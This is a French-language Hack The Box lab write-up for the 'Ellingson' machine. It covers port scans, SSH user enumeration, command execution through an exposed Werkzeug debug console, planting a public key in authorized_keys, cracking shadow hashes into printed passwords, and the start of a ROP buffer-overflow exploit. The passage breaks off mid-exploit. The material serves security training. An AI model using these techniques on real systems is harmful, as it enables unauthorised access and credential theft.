# 10.10.10.139

# Reco

`ping 10.10.10.139`
```
64 bytes from 10.10.10.139: icmp_seq=1 ttl=63 time=34.6 ms
64 bytes from 10.10.10.139: icmp_seq=2 ttl=63 time=37.5 ms
```

`sudo nmap -Pn -sS -vvv -p- -oA 10.10.10.139_sS 10.10.10.139`
```
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

`sudo nmap -Pn -sV -vvv -p22,80 -oA 10.10.10.139_sV 10.10.10.139`
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
```

`sudo nmap -Pn -sC -vvv -p22,80 -oA 10.10.10.139_sC 10.10.10.139`
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNekDYOEF9YFIYWBGwCNM94Oy44bjNn9VlRp8oG8/a+yOHjo0sNd/aYksGIznnzYovF+0h6GDbM1dl/tX3eJgNy8Yil1BOe/sEYajT0vVn8BgJKcdHzAfA9AfpVwkQiJeigy2hcX7urDdoEi5L5uhjl8EqWU15m4bErudukQjmNeTGn1RgW88g8SKNOMI4/weDc2tI8G1J+ZLB/+wpcJe5gCdfnTyhucJqmeZzVy9lDHLpeXlET6Nx931KuJh6+ToXFVT5qB6yMuTnQRgn814uTABbEhxLUUWeFtOtCxLoAjQtpJrQLYaYPaVeewOHWDgDWvhPxYFIZFtiYw7wxsyf
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmN0IVX/rflrwZLRjH3CC3nkAP5gXJwVUK3N7xctzWzR5IpPThLnVpjqGb9IwgROMmS8uTi0ZCQQ/9WSspATFg=
|   256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM8R/Ym8nOpVNvOnGkx6ndSdgJV1UWXwYaCu76M1HYNb
80/tcp open  http    syn-ack ttl 63
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
```

La machine expose deux services, un service SSH et un service web

# Ports
## 22 (SSH)

`telnet 10.10.10.139 22`
```
Trying 10.10.10.139...
Connected to 10.10.10.139.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4
```

`searchsploit "OpenSSH 7."`
```
OpenSSH 2.3 < 7.7 - Username Enumeration  | exploits/linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC) | exploits/linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2) | exploits/linux/remote/45939.py
```

Cette version de OpenSSH est vulnérable à l'énumération de nom de comptes utilisateurs

Pour tester l'exploit on test quelque nom de compte répandus

`python 45939.py 10.10.10.139 root`
```
[+] root is a valid username
```

`python 45939.py 10.10.10.139 www-data`
```
[+] www-data is a valid username
```

On test ce compte grâce aux informations trouvé via la console python de l'application web (voir ci-dessous)

`python 45939.py 10.10.10.139 hal`
```
[+] hal is a valid username
```

## 80 (HTTP)
### Reco 

- Les outils suivants ne donnent aucun résultat probant :
	- Nikto
	- Searchsploit
	- gobuster


- http://10.10.10.139 redirige vers http://10.10.10.139/index

- http://10.10.10.139/articles/0  est la même page que http://10.10.10.139/articles/3
- http://10.10.10.139/articles/-1 est la même page que http://10.10.10.139/articles/2
- http://10.10.10.139/articles/-2 est la même page que http://10.10.10.139/articles/1
- Les pages http://10.10.10.139/articles/-3 et http://10.10.10.139/articles/4 entraîne une erreur de type `OUT OF RANGE`


- Les pages d'erreur permettent d'exposer une interface **WSGI** de **Werkzeug Debugger**
	- La Web Server Gateway Interface (WSGI) est une spécification qui définit une interface entre des serveurs et des applications web pour le langage Python. 


- Quand on a un indice **OUT OF RANGE** on récupére une **erreur 500** avec une **console Python** sur la cible
	- La console Python nous permet d'exécuter des commandes sur la cible

### RCE à travers la console python

- Nom de la machine : 
```python
>>> import socket
>>> print(socket.gethostname())
ellingson
```

- Variables d'environnements : 
```python
>>> import os
>>> print(os.environ)
environ({'LANG': 'en_US.UTF-8', 'INVOCATION_ID': 'e3a169b8fae74021849275fbb01e1d1c', 'FLASK_DEBUG': '1', 'USER': 'hal', 'PWD': '/', 'HOME': '/home/hal', 'JOURNAL_STREAM': '9:28288', 'WERKZEUG_DEBUG_PIN': 'off', 'SHELL': '/bin/bash', 'SHLVL': '1', 'LOGNAME': 'hal', 'PATH': '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3', 'WERKZEUG_SERVER_FD': '3', 'WERKZEUG_RUN_MAIN': 'true'})
```

- Exécution de commandes shell

```python
>>> f = os.popen("ls -la")
>>> r = f.read()
>>> print("", r)
total 1970276
drwxr-xr-x  23 root root       4096 Mar  9  2019 .
drwxr-xr-x  23 root root       4096 Mar  9  2019 ..
drwxr-xr-x   2 root root       4096 Jul 25  2018 bin
drwxr-xr-x   3 root root       4096 Mar  9  2019 boot
drwxr-xr-x  18 root root       3960 Oct 10 04:03 dev
drwxr-xr-x 101 root root       4096 May  7 13:14 etc
drwxr-xr-x   6 root root       4096 Mar  9  2019 home
lrwxrwxrwx   1 root root         33 Mar  9  2019 initrd.img -> boot/initrd.img-4.15.0-46-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  23 root root       4096 May  7 11:22 lib
drwxr-xr-x   2 root root       4096 Jul 25  2018 lib64
drwx------   2 root root      16384 Mar  9  2019 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   3 root root       4096 Mar  9  2019 opt
dr-xr-xr-x 113 root root          0 Oct 10 04:03 proc
drwx------   4 root root       4096 May  1 18:51 root
drwxr-xr-x  25 root root        920 Oct 10 07:43 run
drwxr-xr-x   2 root root      12288 May  7 11:22 sbin
drwxr-xr-x   4 root root       4096 Mar  9  2019 snap
drwxr-xr-x   2 root root       4096 Jul 25  2018 srv
-rw-------   1 root root 2017460224 Mar  9  2019 swap.img
dr-xr-xr-x  13 root root          0 Oct 10 05:34 sys
drwxrwxrwt   9 root root       4096 Oct 10 07:51 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  14 root root       4096 Mar  9  2019 var
lrwxrwxrwx   1 root root         30 Mar  9  2019 vmlinuz -> boot/vmlinuz-4.15.0-46-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
```

- Nous évoluons en contexte utilisateur `hal`
```python
>>> f = os.popen("id")
>>> r = f.read()
>>> print("", r)
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

- Il semble exister 3 autres utilisateurs en plus de `hal`
```python
>>> f = os.popen("cat /etc/passwd")
>>> r = f.read()
>>> print("", r)
root:x:0:0:root:/root:/bin/bash
theplague:x:1000:1000:Eugene Belford:/home/theplague:/bin/bash
hal:x:1001:1001:,,,:/home/hal:/bin/bash
margo:x:1002:1002:,,,:/home/margo:/bin/bash
duke:x:1003:1003:,,,:/home/duke:/bin/bash
```

- Le dossier de l'utilisateur courant contient un dossier `.ssh`

```python
>>> f = os.popen('ls -la ~')
>>> r = f.read()
>>> print("",r)
 total 92
drwxrwx--- 8 hal  hal   4096 Oct 10 07:45 .
drwxr-xr-x 6 root root  4096 Mar  9  2019 ..
-rw-r--r-- 1 hal  hal    220 Mar  9  2019 .bash_logout
-rw-r--r-- 1 hal  hal   3771 Mar  9  2019 .bashrc
drwx------ 2 hal  hal   4096 Mar 10  2019 .cache
drwx------ 3 hal  hal   4096 Oct 10 05:54 .config
drwx------ 3 hal  hal   4096 Mar 10  2019 .gnupg
drwxrwxr-x 3 hal  hal   4096 Oct 10 05:57 .local
-rwx------ 1 hal  hal  31736 Oct 10 05:14 lse.sh
-rw-r--r-- 1 hal  hal    807 Mar  9  2019 .profile
-rw-rw-r-- 1 hal  hal     66 Oct 10 06:04 .selected_editor
drwx------ 2 hal  hal   4096 Oct 10 06:05 .ssh
drwxr-xr-x 2 hal  hal   4096 Oct 10 07:45 .vim
-rw------- 1 hal  hal  10432 Oct 10 07:45 .viminfo
```

- Le dossier `.ssh` est accessible et contient une fichier `authorized_keys` ainsi qu'un fichier de clé privée RSA `id_rsa`

```python
>>> f = os.popen('ls -la ~/.ssh/')
>>> r = f.read()
>>> print("",r)
 total 20
drwx------ 2 hal hal 4096 Oct 10 06:05 .
drwxrwx--- 8 hal hal 4096 Oct 10 07:45 ..
-rw-r--r-- 1 hal hal  567 Oct 10 07:41 authorized_keys
-rw------- 1 hal hal 1766 Mar  9  2019 id_rsa
-rw-r--r-- 1 hal hal  395 Mar  9  2019 id_rsa.pub
```

- La clé privée est `ENCRYPTED` et nécessite donc un mot de passe lorsque l'on essaie de se connecter en SSH avec `ssh hal@10.10.10.139 -i id_rsa_hal`

```python
>>> f = os.popen('cat ~/.ssh/id_rsa')
>>> r = f.read()
>>> print("",r)
 -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,4F7C6A9FD8FB74EDF6E605487045F91D

qVxdFeBjyqXIUkZ6A+8u77HfZgUUwmPOuhN9xFYy+f36kKwr1Wol3iWRHB7W7Ien
5vjyyNT3+mTO272NcAwreWRH0EZWDmvltWP5e9gESTpA4ja+vNP32UNwJ9lK1PLL
mSm7XFl4xOMkhheRzJlLRF7b41C8PKsMVP2DpaHLMxHwTCY1fX5j/QgWpwPN5W0R
DTQvsHyFj+gfsYjCTdrHUX0Dhg+LdVr7SH9NDt0twg/RxtXkAvwbyw3eRXAR0YCB
mrldQ4ymh91G4CapoIOyGUVZUPE/Sz1ZExVCTlfGT9LUgE8L7aaImdOxFkrKDiVb
ddhdWnXwnCrkxIaktwCSIFzl8iT71OxsQOcoq+VV8VbOsL2ICdgHNOIxQ2HonRQS
Ej19P02Ea5rOHVVx/SYxT+ce6Zx301GkYmPu80LVVFK8x7gRajMYgFu/bgC67F91
/QQ6IYkpoSr+eY8l0aJa5IpUo20sGV6xktiyx4V5+kMudiNTE/SAAea/vCCBBqZl
5YFdp/TW5sqvkvB5w4/a/UUj1POa0tT/Ckox9JWq2idq+tYw+MATejY+Xv1HUOun
YuV0Lm5AjdSBAcpIfU6ztJQ1zoVVYPqWXwRia38pSFDTz1pAHt9W6JBCRT3PKLo9
rb8xOhvx6VNj4ZgvaEdxw25RCAGyoEN6/S7z/tgVYZvWoXRqUvOkYq2iyECQ+6ib
qn/YjpRCX0Q9/3QRH0XSfTo7GvzbS4nTC2KubxmG9CJv/AAfdf1DcpvSfjtkUn5a
bN1NOMWbJkrFCLeS6P4fPUJt8VwEJXP+IQaqz9bJYyRI1uIrG2PhzpRZ+24iHv63
2lY+lZpeZBdagYJcp3qnh/f6kVtD+AyhyDurQ+EhsgBdqm4XM+d7AvilTDzqiU3v
b6ZIzTRsVTWUKsTfvkiFop64d8uIov16b6FimiG/YNFQfd7SUL8hvjJVeArWRGjO
vPn+RB4BYS0s3VZI+08Jo/BL8EXFeuMZdpbDFnGDhaINSL1/cZasQS6hRYUJsKZN
T7ptM3NdKNyrVGwfKyttp3OHZFjPRjZezpBR60q+HI37pt/iDkuhbeK2Pr9jNR3f
jfqv8lGlOMIoPA6ERxPveUrLldL6NfLT0gPasDrWo0RRDIzanqz0wYK/SfuIiumT
8tonBa4kQlxAyenW1p+nx5bZ1QXPQaUbXbAe3AbOU2YG20LJ0v8mxVZE0zP9QNZM
DSHtv3uIl3nONJIJryp8Y6UjW1q3+UaAnTS6J/IXk+JVsSIRs5hbNDtNLlhFowDq
2OWEh2CRE7TNptk6Bb8pZbfyA/lCXJhJjo8YZLc3xZ2h1WF1vaXCHYo/FNqeoS0k
yicWCEz2fSKfNMnMpcVreQglfA9u49+Cvqzt1JnIlX1gDUg8EXV5rLAEgiSRfVin
B1pTjH/EROnppfQkteSbRq9B9rrvcEQ8Q5JPjr7kp3kk07spyiV6YqNmxVrvQtck
rQ+X68SNYRpsvCegy59Dbe5/d6jMdFxBzUZQKAHCyroTiUS8PtsAIuRechR0Cbza
OM2FRsIM8adUzfx7Q91Or+k2pIKNKqr+5sIpb4M0GHggd7gD10E+IBUjM9HsQR+o
-----END RSA PRIVATE KEY-----
```

- Impossible de se connecter avec cette clé privée, nécessite la passphrase

```
ssh hal@10.10.10.139 -i id_rsa
Enter passphrase for key 'id_rsa': 
n/A
```

### Accés SSH à travers l'utilisateur hal

- On a **accés en écriture** au fichier **authorized_keys** de hal, on peut donc **ajouter notre clé publique** et se **connecter** en SSH **en tant que hal** en fournissant **notre clé privée**


- Génération des clés :

`ssh-keygen -t rsa -b 4096 -o -a 100`
```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/audit/.ssh/id_rsa): /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/id_rsa.
Your public key has been saved in /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/id_rsa.pub.
The key fingerprint is:
SHA256:FQbGCT82H6KbYluMI9BcsQqp5krHMpPjWxCTj8DHymg audit@ptk
The key's randomart image is:
+---[RSA 4096]----+
|    . .oooo      |
|..o  o oo. .     |
|+= oo   * o      |
|=+Bo   o * .     |
|+E+.  . S .      |
|+.+  o o         |
| O.+= =          |
|+ Bo =           |
|.o. .            |
+----[SHA256]-----+
```

- **PASSPHRASE : ellingson**

- On ajoute notre cle PUBLIQUE aux fichier authorized_keys de la cible
	- **ATTENTION A BIEN AJOUTER DES \n AVANT LA CLE**
```python
>>> f = os.popen('echo "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+T0gEWGYsehaz0H0qSxaofBO0Z4jbOMMksXm4EWb2SwIsfASwgxHcKTTzP9k3yJjV0a6IX7xxUUMmQ1HnbmiLXpY3DeCERsFLN4T1whVL/ZepMk1lBMPgRAlKNBhIdNTm7FEa10TJUoQjJXb81/WBKSFIxClkDqbaqZjGvosavmN4V9/1QAjBangssIfVEiXUrUJsjjxHcnV0OE0oDCh3y1VYVIsGF7hrfaYQNCr2NOAqzOFgJpaZE77Kj122un2RYmg6Qzo/Rt8K1jPhey2+klsR+W0l5gmmwebPz/AiDjPBzWXLnWfke0/+bX4oYLSPKYYqSq8HqjG9+jejHY2RwnjD8GeJ7JRz4wn3QJwESOGWTCVlcwWIfCYV8KlWYkY2m61KN3aGssgkH2OYI9Y9dYj7YautmBjnrnMrZzIRFdbesWf4uwMmrHnrcNy35aC1eSvCbIMqnmBWYVUCJMipsX12IaaafqiqoKRXvdNu8vW2KQVOSypEVCkTO3I43+MqGXmZ3eOqzUCF41r3G5EjoU6lAAy80Jh86nHvP9SFSI0pvs6fE89DyVJxmX2zJl9X0qbRNAkcPDNYbZMzSNflrinOxmc9MnNPFr4gGpi1igProL3Eo+alu3MzCKJ1AdnAE88H0C0rHnnk8Snen+lDYFua0/hPiOi1Fbhg4+ZC+Q== audit@ptk" >> ~/.ssh/authorized_keys')
>>> r = f.read()
>>> print("",r)
```

- On se connecte avec **NOTRE CLE PRIVE** en tant que hal

`ssh hal@10.10.10.139 -i id_rsa`
```
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$
```

- On vérifie les groupes auquel notre utilisateur appartient

`hal@ellingson:~$ cat /etc/group`
```
root:x:0:
adm:x:4:syslog,theplague,hal
cdrom:x:24:theplague
sudo:x:27:theplague
dip:x:30:theplague
plugdev:x:46:theplague
lxd:x:108:theplague
theplague:x:1000:
hal:x:1001:
margo:x:1002:
duke:x:1003:
```

- `hal` appartient au groupe `adm`

`id`
```
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

`uname -a`
```
Linux ellingson 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

`searchsploit "Linux Kernel 4.15"`
```
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method) | exploits/linux/local/47164.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method) | exploits/linux/local/47165.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method) | exploits/linux/local/47166.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method) | exploits/linux/local/47167.sh
```

- On test quelque exploit en transférant les fichiers via `scp`
`scp -i id_rsa 47167.sh hal@10.10.10.139:/home/hal`


- Aucun exploit de Local Privilege Escalation ne fonctionne


- On essaie de faire du brute force sur les autres comptes SSH en temporisant et en utilisant les informations présentes sur le site web

`hydra -L user.lst -P seed.rules 10.10.10.139 -t 1 -c 20 -V ssh`

### Elevation de privilege (utilisateur)

- On découvre un fichier `shadow.bak` dans `/var/backups`

```
/var/backups
-rw-r-----  1 root adm      1309 Mar  9  2019 shadow.bak
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

- On tente de casser les hash en utilisant `rockyou.txt`

`john --wordlist=/opt/wordlists/rockyou.txt hashes.list`


- Mais en utilisant
	- Les informations donné sur le site *Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God*
	- La politique de mot de passe de système
		- `cat /etc/pam.d/common-password |grep -v "#"`
		```
		password	[success=1 default=ignore]	pam_unix.so obscure sha512
		password	requisite			pam_deny.so
		password	required			pam_permit.so
		```
		- *By default, Ubuntu requires a minimum password length of 6 characters, as well as some basic entropy checks*


- **Il est possible de réduire drastiquement le nombre de mot**
	- En utilisant rockyou au complet (14 millions de mots) : ~ 08h00


- Le but est de supprimer dans rockyou les strings ne correspondant pas à la politique de mot de passe
    - `awk 'length($0) >= 6' /opt/wordlists/rockyou.txt > length6_rockyou`
        - La diff est trop faible aprés avoir garde seulement les strings de >=6
    - `awk '/.*[a-z]+.*[0-9]+.*/{print $0}' length6_rockyou > length6_letter_number_rockyou`
        - On a divisé par 2
		- A permis de trouver "margo" en moins de ~ 02h00
	- On peut aussi filtrer en utilisant les mots clés présent dans l'article du site
		- `while read line; do cat /opt/wordlists/rockyou.txt |grep -i $line >> pwd.list; done < website-pwd.lst`


- Le mot de passe de theplague ne fonctionne pas, c'est celui de margo qu'il faut utiliser
```
password123      (theplague)
iamgod$08        (margo)
```

- On se connecte en tant que margo
`ssh margo@10.10.10.139`
```
margo@10.10.10.139's password: 
margo@ellingson:~$
```

### Elevation de privilege (root)

- https://jlajara.gitlab.io/posts/2019/06/15/Privesc_Ret2libc_ASLR_64.html
- https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/

#### Connaissances théoriques

- PLT : Procedure Linkage Table 
	- Utilisé pour appelé des fonctions/procédures dont l'adresse n'est pas connus au moment de l'édition des liens
- GOT : Global Offsets Table
	- Table d'adresse stockée dans la section de data, utilisé par le programme executé pour toruver durant l'exécution les adresses des variables globale inconnus au moment de la compilation
- GOT and PLT sont utilisée directement depuis n'importe ou dans le programme
	- Doivent avoir une adresse statique en mémoire
- ROP : Return-Oriented Programming technique d'exploitation de type BO permettant l'exécution de code en s'affranchissant de protection tels que DEP/NX/ASLR
	- Permet d'obtenir le contrôle de la stack d'un programme, d'en rediriger les flux et d'exécuter une des instructions situées en zone mémoire exécutable, appelées « gadgets »
		- Chaque gadget est suivi d'une instruction ret et localisé dans une routine d'un autre programme ou dans le code d'une bibliothèque dynamique chargée en mémoire
		- Une fois assemblés, ces gadgets forment une ROP chain3 et permettent d'effectuer des opérations arbitraires sur une machine employant des mécanismes de protection
- ASLR (Address space layout randomization)
	- Mécanisme de protection de la mémoire contre les buffer overflow en rendant aléatoire l'adresse mémoire ou les binaires systèmes sont chargés en mémoire


- Registers
	- RDI, RSI : permettent le passage de parametre à une fonction
		- Dans une architecture x64 la convention d'appel indique que le premier paramétre d'une méthode doit être placé dans le registre RDI
- ASM instructions
	- POP : Enleve une elément de la pile (stack)


- pwntools : Framework python permettant la réalisation d'exploit
- ROPGadget : Permet de chercher des "gadgets" dans un fichier binaire pour faciliter l'exploitation via ROP 
- objdump   : Permet d'afficher diverses informations sur les fichiers objets sur des systèmes type Unix
- GDB : GNU Project Debugger
- PEDA : Python Exploit Development Assistance for GDB

#### Reco

- Linux Smart Enumeration : 
```
[!] fst020 Uncommon setuid binaries........................................ yes!
/usr/bin/garbage
```

- Téléchargement en local

`scp -i ../id_rsa hal@10.10.10.139:/usr/bin/garbage garbage`

- Fichier 64-bit

`file garbage`
```
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

- Chaine de caractere presente
	- On identifie une chaine semblant être un mot de passe `N3veRF3@r1iSh3r3!`
	
`strings garbage`
```
[...]
user: %lu not authorized to access this application
User is not authorized to access this application. This attempt has been logged.
error
Enter access password: 
N3veRF3@r1iSh3r3!
access granted.
access denied.
[...]
```

- On lance le binaie en **TANT QUE** "hal"
	- Le binaire bloque l'execution du fait du contexte utilisateur
	```
	hal@ellingson:~$ /usr/bin/garbage 
	User is not authorized to access this application. This attempt has been logged.
	`` 

- Quand on l'execute sur notre machine en locale il requiere un mot de passe


- On lance le binaire en TANT QUE "margo"
	- il requiere un mot de passe

```
margo@ellingson:~$ /usr/bin/garbage
Enter access password: N3veRF3@r1iSh3r3!
access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
>
```

#### Protection sur le binaire

`gdb garbage`
```
Reading symbols from garbage...
(No debugging symbols found in garbage)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

- L'ASLR est activée

`hal@ellingson:/tmp$ cat /proc/sys/kernel/randomize_va_space`
```
2
```

- Dépendances à la libc

`ldd garbage/garbage`
```
linux-vdso.so.1 (0x00007ffd2c3de000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f172dc10000)
/lib64/ld-linux-x86-64.so.2 (0x00007f172ddfe000)
```

**Nota bene** : Il est judicieux de **télécharger en local** la libc de la cible pour éviter les problémes d'allocation mémoire qui peuvent varier d'une version à l'autre de la libc

- On utilise `ltrace` pour analyser le fonctionnement du binaire
	- La comparasion des chaines avec `strcmp("test", "N3veRF3@r1iSh3r3!")` le rends vulnérable aux buffer overflow

`ltrace garbage/garbage` 
```
getuid()
syslog(6, "user: %lu cleared to access this"..., 1000)
getpwuid(1000, 1, 0, 0x143f010)                       
strcpy(0x7ffee899d984, "audit")                                
printf("Enter access password: ")                              
gets(0x7ffee899d920, 32, 0x7f391d5de8c0, 0Enter access password: test
)                                                              
putchar(10, 0x7365, 0x7f391d5de8d0, 0x7f391d5dca00
)                                                 
strcmp("test", "N3veRF3@r1iSh3r3!")               
puts("access denied."access denied.
)                                  
exit(-1 <no return ...>
```

- La chaine de caractére `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` est la chaine minimum pour entrainer une **segfault**

```
./garbage                                                                                                                                                      Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
access denied.
[1]    31216 segmentation fault  ./garbage
```

- Du fait des protections présentes il faut utiliser la méthode **ROP+leak technique** pour exploiter ce BO
	- DEP étant activé nous utilisont l'attque ROP (passer `/bin/sh` à une chaine de ROP qui la passera à la fonction `system()` comme argument)
	- ASLR étant activé il faut faire fuiter l'adresse de put@GLIBC et on l'utilise pour calculer l'offset utilisé ensuite

- On peut l'exécuter au sein de `gdb-peda`

`gdb-peda$ r`
```
Starting program: /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/garbage/garbage 
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecd504 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fa08c0 --> 0x0 
RSI: 0x406bb0 ("access denied.\nssword: ")
RDI: 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffddf8 ('A' <repeats 200 times>...)
RIP: 0x401618 (<auth+261>:	ret)
```

Le registre `RSP` (stack pointer) est remplis de `A`

#### Déterminer l'offset de RSP

- On cree un pattern de longueure suffisante pour remplir `RSP` et déterminer précisément le nom de `A` nécessaire

`gdb-peda$ pattern_create 200`
```
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
```

- On utilise ce pattern

`gdb-peda$ r`
```
Starting program: /mnt/hgfs/PARTAGE-VM/SHARED/TRAINING/HtB/Boxes/OnMyWay/Ellingson/garbage/garbage 
Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ecd504 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fa08c0 --> 0x0 
RSI: 0x406bb0 ("access denied.\nssword: ")
RDI: 0x0 
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fffffffddf8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x401618 (<auth+261>:	ret)
```

- On donne le contenus de **RSP**  à la fonction `pattern_offset` pour déterminer l'offset correspondant à la chaine se trouvant dans **RSP**

`gdb-peda$ pattern_offset AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA`
```
AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 136
```

Il faut donc **136 A** pour réécrire le contenus de **RSP**

- Vérifier si on controle bien RIP en créant une chaine de **136 A** suivit de **6 B** qui devrait aller se placer dans **RIP**
	- Générer la chaine en python

	`python -c 'print "A"*136 + "B"*6'`
	```
